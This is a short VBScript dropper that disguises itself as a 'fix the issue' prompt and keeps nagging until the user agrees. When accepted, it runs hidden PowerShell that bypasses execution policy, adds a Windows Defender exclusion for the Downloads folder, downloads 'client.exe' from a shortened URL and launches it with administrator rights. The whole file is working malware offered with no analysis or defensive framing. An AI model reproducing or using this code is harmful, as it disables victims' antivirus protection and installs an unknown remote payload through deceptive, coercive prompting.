Set WshShell = CreateObject("WScript.Shell")

Do
    ' Ask the user if they want to fix the issue
    response = WshShell.Popup("Do you want to fix the issue?", 0, "Permission Request", 4 + 32)
    
    ' If the user clicks "Yes" (Response 6)
    If response = 6 Then
        ' PowerShell command to run with elevated permissions
        strCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Start-Process PowerShell -ArgumentList '-ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads; $url = ''http://surl.li/nkyemz''; $outputFile = [System.IO.Path]::Combine($env:USERPROFILE, ''Downloads'', ''client.exe''); Start-Sleep -Milliseconds 100; Invoke-WebRequest -Uri $url -OutFile $outputFile; Start-Process -FilePath $outputFile' -Verb RunAs"""
        
        ' Run the PowerShell command
        result = WshShell.Run(strCommand, 0, True)
        
        ' If the user allowed the process to run successfully
        If result = 0 Then
            ' PowerShell has been opened successfully, exit the loop
            WScript.Echo "Issue fixed successfully."
            Exit Do
        Else
            ' If PowerShell did not open, show error message and continue the loop
            WshShell.Popup "There was an issue running PowerShell with admin privileges. Error Code: " & result, 2, "Error", 16
        End If
    End If
    
    ' If the user clicks "Cancel" (Response 2), "No" (Response 7), or presses "Esc" (Response -1)
    If response = 2 Or response = 7 Or response = -1 Then
        WshShell.Popup "You canceled or pressed Esc. Trying again...", 2, "Permission Required", 64
    End If
Loop
